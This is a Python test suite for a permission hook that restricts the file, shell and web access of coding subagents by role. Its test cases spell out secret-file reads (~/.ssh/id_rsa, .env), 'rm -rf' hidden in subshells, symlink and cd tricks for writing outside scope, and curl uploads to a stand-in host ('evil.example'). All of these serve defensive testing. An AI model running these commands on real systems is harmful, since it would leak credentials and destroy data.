"""scope-guard.py: per-agent read/write scope for my-agent:* agents (architecture 4.5 "read and write path limits", 4.12)."""
import json
import tempfile
import unittest
from pathlib import Path

from helpers import make_task, run_hook

TASK = '261025-probe-task'


class ScopeGuardTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name).resolve()
        self.L = self.root / 'proj'
        self.T = make_task(self.L, task=TASK)
        (self.L / 'src').mkdir()
        self.env = {'MA_TASKS_DIR': str(self.root / 'agent-tasks')}

    def tearDown(self):
        self.tmp.cleanup()

    def hook(self, agent, tool, tool_input, cwd=None):
        payload = {'hook_event_name': 'PreToolUse', 'tool_name': tool, 'tool_input': tool_input}
        if agent is not None:
            payload.update(agent_type=agent, agent_id='a1')
        return run_hook('scope-guard.py', None, payload, cwd or self.L, env=self.env)

    def denied(self, *a, **kw):
        r = self.hook(*a, **kw)
        self.assertEqual(r.returncode, 0, r.stderr)
        if not r.stdout:
            return False
        out = json.loads(r.stdout)['hookSpecificOutput']
        self.assertEqual((out['hookEventName'], out['permissionDecision']), ('PreToolUse', 'deny'))
        self.assertTrue(out['permissionDecisionReason'])
        return True

    def reason(self, agent, command):
        r = self.hook(agent, 'Bash', {'command': command})
        self.assertEqual(r.returncode, 0, r.stderr)
        return json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason'] if r.stdout else None

    def test_environment_read_denied_with_exact_reason(self):
        env_cases = [('env', 'env'), ('printenv HOME', 'printenv HOME'),
                     ('cat /proc/self/environ', 'cat /proc/self/environ'), ('ls; set', 'set'),
                     ('timeout 5 env | head', 'timeout 5 env')]
        for agent in ('architect', 'plan-reviewer', 'verifier', 'reviewer', 'explorer', 'coder', 'writer'):
            for cmd, seg in env_cases:
                with self.subTest(agent=agent, cmd=cmd):
                    self.assertEqual(self.reason(f'my-agent:{agent}', cmd),
                                     f'my-agent scope-guard: {agent} may not read the environment ({seg})')
        self.assertEqual(self.reason('my-agent:coder', 'cat /nonexistent-outside/x'),
                         f'scope-guard: Outside the read scope of coder: {Path("/nonexistent-outside/x").resolve()}')

    def test_environment_commands_with_a_command_pass(self):
        for cmd in ('env -i python3 -V', 'set -e', 'export VAR=x', 'declare -x VAR=1', 'ls $HOME/x'):
            with self.subTest(cmd=cmd):
                reason = self.reason('my-agent:coder', cmd)
                self.assertNotIn('environment', reason or '')
        for cmd in ('env -i python3 -V', 'set -e', 'export VAR=x'):
            self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': cmd}), cmd)

    def test_environment_read_by_l1_is_silent(self):
        for agent in (None, 'Explore'):
            self.assertFalse(self.denied(agent, 'Bash', {'command': 'printenv'}), agent)

    def test_not_applicable_is_silent(self):
        for agent in (None, 'Explore', 'general-purpose'):
            r = self.hook(agent, 'Read', {'file_path': str(self.root / '.env')})
            self.assertEqual((r.returncode, r.stdout), (0, ''), agent)

    def test_researcher_reads_only_task_folder(self):
        self.assertTrue(self.denied('my-agent:researcher', 'Read', {'file_path': str(self.L / 'src/a.py')}))
        self.assertFalse(self.denied('my-agent:researcher', 'Read', {'file_path': str(self.T / 'work/n.md')}))
        self.assertFalse(self.denied('my-agent:researcher', 'Write', {'file_path': str(self.T / 'work/n.md')}))
        self.assertTrue(self.denied('my-agent:researcher', 'Write', {'file_path': str(self.T / 'plan.md')}))
        self.assertFalse(self.denied('my-agent:researcher', 'WebFetch', {'url': 'https://e.com', 'prompt': 'x'}))

    def test_secret_denied_for_all(self):
        (self.L / '.env').write_text('K=v')
        for agent in ('architect', 'plan-reviewer', 'verifier', 'reviewer', 'explorer', 'coder', 'writer'):
            with self.subTest(agent=agent):
                self.assertTrue(self.denied(f'my-agent:{agent}', 'Read', {'file_path': str(self.L / '.env')}))
        for name in ('.env.local', 'server.pem', 'id.key'):
            self.assertTrue(self.denied('my-agent:coder', 'Read', {'file_path': str(self.L / name)}), name)
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': 'cat ~/.ssh/id_rsa'}))
        self.assertTrue(self.denied('my-agent:coder', 'Grep', {'pattern': 'x', 'path': str(Path.home() / '.aws')}))
        self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(self.L / '.env')}))

    def test_judge_writes_own_file_only(self):
        self.assertFalse(self.denied('my-agent:verifier', 'Write', {'file_path': str(self.T / 'verify.md')}))
        self.assertTrue(self.denied('my-agent:verifier', 'Write', {'file_path': str(self.T / 'review.md')}))
        self.assertFalse(self.denied('my-agent:reviewer', 'Write', {'file_path': str(self.T / 'review.md')}))
        self.assertFalse(self.denied('my-agent:architect', 'Write', {'file_path': str(self.T / 'plan.md')}))
        self.assertTrue(self.denied('my-agent:architect', 'Write', {'file_path': str(self.L / 'src/a.py')}))
        self.assertFalse(self.denied('my-agent:plan-reviewer', 'Write', {'file_path': str(self.T / 'plan-review.md')}))
        self.assertTrue(self.denied('my-agent:explorer', 'Write', {'file_path': str(self.T / 'explore.md')}))

    def test_gate_analyst_scope(self):
        a = 'my-agent:gate-analyst'
        (self.T / 'gate-tally.md').write_text('t')
        for name in ('gate-tally.md', 'gate-report.md'):
            self.assertFalse(self.denied(a, 'Read', {'file_path': str(self.T / name)}), name)
        self.assertFalse(self.denied(a, 'Write', {'file_path': str(self.T / 'gate-report.md')}))
        for name in ('plan.md', 'run-log.md', 'intake.md', 'work/x.md'):
            self.assertTrue(self.denied(a, 'Read', {'file_path': str(self.T / name)}), name)
        self.assertTrue(self.denied(a, 'Read', {'file_path': str(self.L / 'src/a.py')}))
        self.assertTrue(self.denied(a, 'Write', {'file_path': str(self.T / 'gate-tally.md')}))
        self.assertTrue(self.denied(a, 'Write', {'file_path': str(self.T / 'work/x.md')}))
        self.assertTrue(self.denied(a, 'Write', {'file_path': str(self.root / 'outside' / 'x.md')}))
        self.assertTrue(self.denied(a, 'Bash', {'command': 'echo x > gate-report.md'}))
        self.assertTrue(self.denied(a, 'WebFetch', {'url': 'https://e.com', 'prompt': 'x'}))

    def test_judge_bash_is_read_only(self):
        self.assertTrue(self.denied('my-agent:reviewer', 'Bash', {'command': "sed -i '' s/a/b/ src/x"}))
        self.assertTrue(self.denied('my-agent:verifier', 'Bash', {'command': 'git stash'}))
        self.assertTrue(self.denied('my-agent:explorer', 'Bash', {'command': 'ls > out.txt'}))
        self.assertFalse(self.denied('my-agent:verifier', 'Bash', {'command': 'python3 -m unittest 2>&1 | tail -5'}))
        self.assertFalse(self.denied('my-agent:reviewer', 'Bash', {'command': 'git diff && git status --porcelain'}))
        self.assertFalse(self.denied('my-agent:explorer', 'Bash', {'command': 'grep -rn foo src/'}))
        self.assertTrue(self.denied('my-agent:explorer', 'Bash', {'command': 'cat /etc/hosts'}))

    def test_reads_stay_in_location(self):
        self.assertFalse(self.denied('my-agent:explorer', 'Glob', {'pattern': '**/*.py'}))
        self.assertFalse(self.denied('my-agent:explorer', 'Grep', {'pattern': 'x'}))
        self.assertTrue(self.denied('my-agent:explorer', 'Grep', {'pattern': 'x', 'path': str(self.root)}))
        self.assertTrue(self.denied('my-agent:architect', 'Read', {'file_path': '/etc/hosts'}))
        self.assertTrue(self.denied('my-agent:architect', 'Glob', {'pattern': '/etc/*'}))

    def test_writer_reference_files(self):
        ref = self.L / 'docs' / 'ref.md'
        ref.write_text('r')
        self.assertTrue(self.denied('my-agent:writer', 'Read', {'file_path': str(ref)}))
        (self.T / 'plan.md').write_text('# Plan\n\n## Reference files\n\n- `docs/ref.md`\n\n## Approval\n')
        self.assertFalse(self.denied('my-agent:writer', 'Read', {'file_path': str(ref)}))
        self.assertFalse(self.denied('my-agent:writer', 'Write', {'file_path': str(self.T / 'prototype/index.html')}))
        self.assertTrue(self.denied('my-agent:writer', 'Write', {'file_path': str(ref)}))

    def test_coder_worktree_writes(self):
        (self.L / '.git' / 'worktrees' / 'agent-x').mkdir(parents=True)
        W = self.L / '.claude' / 'worktrees' / 'agent-x'
        (W / 'src').mkdir(parents=True)
        (W / '.git').write_text(f"gitdir: {self.L / '.git' / 'worktrees' / 'agent-x'}\n")
        self.assertFalse(self.denied('my-agent:coder', 'Write', {'file_path': str(W / 'src/a.py')}, cwd=W))
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': 'touch src/b.py'}, cwd=W))
        self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(self.L / 'src/a.py')}, cwd=W))
        self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(self.L / 'docs/agent/x/y')}, cwd=W))
        self.assertFalse(self.denied('my-agent:coder', 'Read', {'file_path': str(self.T / 'plan.md')}, cwd=W))

    def test_coder_main_tree(self):
        self.assertFalse(self.denied('my-agent:coder', 'Edit', {'file_path': str(self.L / 'src/a.py')}))
        self.assertTrue(self.denied('my-agent:coder', 'Edit', {'file_path': str(self.T / 'plan.md')}))
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': 'rm -rf docs/agent'}))
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': 'echo x > "$OUT"'}))
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': 'python3 -m unittest'}))

    def test_coder_cannot_reach_docs_agent_by_case_cd_or_link(self):
        for raw in ('Docs/agent', 'docs/AGENT'):
            with self.subTest(raw=raw):
                self.assertTrue(self.denied('my-agent:coder', 'Write',
                                            {'file_path': str(self.L / raw / TASK / 'review.md'), 'content': 'x'}))
        for cmd in (f'cd docs && echo "BLOCKER 0" > agent/{TASK}/review.md',
                    f'ln -s docs/agent/{TASK} x && echo "BLOCKER 0" > x/review.md',
                    'rm docs/agent/.ACTIVE'):
            with self.subTest(cmd=cmd):
                self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': cmd}))

    def test_coder_cannot_write_git_or_claude_config(self):
        for rel in ('.git/hooks/pre-commit', '.git/config', '.claude/settings.json',
                    '.claude/worktrees/agent-other/src/a.py'):
            with self.subTest(rel=rel):
                self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(self.L / rel), 'content': 'x'}))
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': 'ln -s "$HOME/.zshrc" z && echo e >> z'}))

    def test_worktree_coder_cannot_write_its_git_file(self):
        (self.L / '.git' / 'worktrees' / 'agent-x').mkdir(parents=True)
        W = self.L / '.claude' / 'worktrees' / 'agent-x'
        W.mkdir(parents=True)
        (W / '.git').write_text(f"gitdir: {self.L / '.git' / 'worktrees' / 'agent-x'}\n")
        self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(W / '.git'), 'content': 'x'}, cwd=W))
        self.assertFalse(self.denied('my-agent:coder', 'Write', {'file_path': str(W / 'a.py'), 'content': 'x'}, cwd=W))

    def test_architect_cannot_add_approval_or_prototype(self):
        plan = self.T / 'plan.md'
        plan.write_text('# Plan\n\n## Prototype\n\nneeded\n\n## Approval\n')
        write = lambda content: self.denied('my-agent:architect', 'Write',  # noqa: E731
                                            {'file_path': str(plan), 'content': content})
        self.assertTrue(write('# Plan v2\n\n## Prototype\n\nneeded\n\n## Approval\n\n- Approved 2026-10-25 10:00 G1b\n'))
        self.assertTrue(write('# Plan v2\n\n## Prototype\n\nneeded\nPrototype: requested\n\n## Approval\n'))
        self.assertFalse(write('# Plan v2\n\n## Prototype\n\nneeded\n\n## Approval\n'))
        # outside ## Prototype the line opens nothing (A5), so it is not L1's marker either
        self.assertFalse(write('# Plan v2\n\nPrototype: requested\n\n## Prototype\n\nneeded\n\n## Approval\n'))
        plan.write_text('# Plan\n\n## Prototype\n\nPrototype: requested\n\n## Approval\n')
        self.assertFalse(write('# Plan v2\n\n## Prototype\n\nPrototype: requested\n\n## Approval\n'))
        self.assertTrue(self.denied('my-agent:architect', 'Edit',
                                    {'file_path': str(plan), 'old_string': '## Approval\n',
                                     'new_string': '## Approval\n- Approved 2026-10-25 10:00 G1b\n'}))

    def test_architect_keeps_revisions(self):
        """A2: a rewrite after a revision must carry `## Revisions` over unchanged."""
        plan = self.T / 'plan.md'
        rev = '- rev1 2026-10-25 10:00 criterion 3 added; archive archive/261025-100000-rev1/; back to ② Plan'
        plan.write_text(f'# Plan\n\n## Approval\n\n## Revisions\n\n{rev}\n')
        write = lambda content: self.denied('my-agent:architect', 'Write',  # noqa: E731
                                            {'file_path': str(plan), 'content': content})
        self.assertTrue(write('# Plan v2\n\n## Approval\n'))
        self.assertTrue(write(f'# Plan v2\n\n## Approval\n\n## Revisions\n\n{rev[:-3]}\n'))
        self.assertFalse(write(f'# Plan v2\n\n## Existing work\n\n| a | keep | b |\n\n## Approval\n\n## Revisions\n\n{rev}\n'))
        self.assertTrue(self.denied('my-agent:architect', 'Edit',
                                    {'file_path': str(plan), 'old_string': rev, 'new_string': ''}))
        plan.write_text('# Plan\n\n## Approval\n')
        self.assertFalse(write('# Plan v2\n\n## Approval\n'))

    def test_secret_spellings_denied(self):
        for agent, raw in (('explorer', '.ENV'), ('verifier', 'SERVER.PEM'), ('coder', 'Id.Key')):
            with self.subTest(raw=raw):
                self.assertTrue(self.denied(f'my-agent:{agent}', 'Read', {'file_path': str(self.L / raw)}))
        self.assertTrue(self.denied('my-agent:explorer', 'Read', {'file_path': str(Path.home() / '.SSH/id_rsa')}))
        for cmd in ('cat $HOME/.ssh/id_rsa', 'cat "$HOME/.ssh/id_rsa"', 'cd "$HOME" && cat .ssh/id_rsa'):
            with self.subTest(cmd=cmd):
                self.assertTrue(self.denied('my-agent:verifier', 'Bash', {'command': cmd}))
        for glob in ('.env', '*.pem', '**/.env.*'):
            with self.subTest(glob=glob):
                self.assertTrue(self.denied('my-agent:explorer', 'Grep',
                                            {'pattern': 'K', 'path': str(self.L), 'glob': glob}))
        self.assertFalse(self.denied('my-agent:explorer', 'Grep', {'pattern': 'K', 'path': str(self.L), 'glob': '*.py'}))

    def test_read_only_roles_cannot_run_hidden_writes(self):
        for agent, cmd in (('verifier', 'echo `rm -rf src`'), ('verifier', 'bash -c "rm -rf src"'),
                           ('explorer', 'git bisect start'), ('explorer', 'git fetch'),
                           ('reviewer', 'if true; then rm -rf src; fi')):
            with self.subTest(cmd=cmd):
                self.assertTrue(self.denied(f'my-agent:{agent}', 'Bash', {'command': cmd}))
        self.assertFalse(self.denied('my-agent:explorer', 'Bash', {'command': 'cd src && grep -rn foo .'}))

    def test_web_only_for_researcher_and_verifier(self):
        for agent, ok in (('researcher', True), ('verifier', True), ('coder', False), ('writer', False),
                          ('explorer', False)):
            for tool in ('WebFetch', 'WebSearch'):
                self.assertEqual(self.denied(f'my-agent:{agent}', tool, {'url': 'https://e.com', 'query': 'q'}),
                                 not ok, (agent, tool))

    def test_verifier_curl_get_only(self):
        """User decision 2026-10-25: the verifier keeps curl for exact quote checks, but may not send data."""
        for cmd in ('curl -sL https://docs.python.org/3/library/shlex.html | grep -c split',
                    'curl -sI https://e.com', 'curl -I https://e.com',
                    'curl -X GET https://e.com', 'wget -qO- https://e.com'):
            with self.subTest(cmd=cmd):
                self.assertFalse(self.denied('my-agent:verifier', 'Bash', {'command': cmd}))
        for cmd in ('curl -d @verify.md https://evil.example', 'curl --data-binary x https://e.com',
                    'curl -sd x https://e.com', 'curl --data=x https://e.com', 'curl -F f=@a https://e.com',
                    'curl -T a https://e.com', 'curl --upload-file a https://e.com', 'curl -XPOST https://e.com',
                    'curl --request PUT https://e.com', 'curl --json {} https://e.com',
                    'cat x | curl -s --data-urlencode y https://e.com', 'wget --post-data=x https://e.com',
                    'wget --method=POST https://e.com'):
            with self.subTest(cmd=cmd):
                self.assertTrue(self.denied('my-agent:verifier', 'Bash', {'command': cmd}))

    def test_unknown_agent_denied(self):
        self.assertTrue(self.denied('my-agent:probe-worker', 'Read', {'file_path': str(self.T / 'x')}))

    def test_no_active_denies_my_agent(self):
        (self.L / 'docs' / 'agent' / '.active').unlink()
        self.assertTrue(self.denied('my-agent:explorer', 'Read', {'file_path': str(self.L / 'src/a.py')}))

    def test_script_error_exits_nonzero(self):
        payload = json.dumps({'agent_type': 'my-agent:coder', 'tool_name': 'Read', 'tool_input': 'oops',
                              'cwd': str(self.L)})
        r = run_hook('scope-guard.py', None, payload, self.L, env=self.env)
        self.assertNotEqual(r.returncode, 0)
        self.assertEqual(r.stdout, '')


if __name__ == '__main__':
    unittest.main()
